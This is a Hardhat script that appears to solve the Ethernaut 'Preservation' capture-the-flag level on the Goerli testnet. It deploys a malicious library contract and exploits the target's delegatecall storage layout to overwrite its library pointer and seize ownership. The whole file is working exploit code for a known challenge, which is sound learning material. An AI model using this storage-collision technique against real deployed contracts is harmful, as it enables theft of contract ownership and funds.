// @ts-ignore
import { ethers } from "hardhat";

async function main() {

  const pres = await ethers.getContractFactory('Preservation')
  const preserve = await pres.attach("0xb3B43aC658C5c71e714A3ecA9469a11E77f18Da8")
  const provider = await ethers.getDefaultProvider("goerli")

  let owner = await provider.getStorageAt(preserve.address, 2)
  console.log("Owner is:", owner)

  let timeZoneLibrary1Address = await provider.getStorageAt(preserve.address, 0)
  console.log("TimeZone Library address:", timeZoneLibrary1Address)

  // Deploying Malicious Library
  const badLibrary = await ethers.getContractFactory('MaliciousLibraryContract')
  const attack = await badLibrary.deploy()
  await attack.deployed()
  console.log("Malicious Library Contract Address:", attack.address)

  // Changing the library contract with malicious one
  let tx1 = await preserve.setFirstTime(attack.address)
  await tx1.wait()
  let libraryAddress = await provider.getStorageAt(preserve.address, 0)
  console.log("TimeZone Library one after delegation contract", libraryAddress)

  // Invoking SetFirstTime again to change Ownership to msg.sender
  let tx2 = await preserve.setFirstTime("135762")
  await tx2.wait()
  
  let owner2 = await provider.getStorageAt(preserve.address, 2)
  console.log("Owner Address should change to msg.sender:", owner2)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
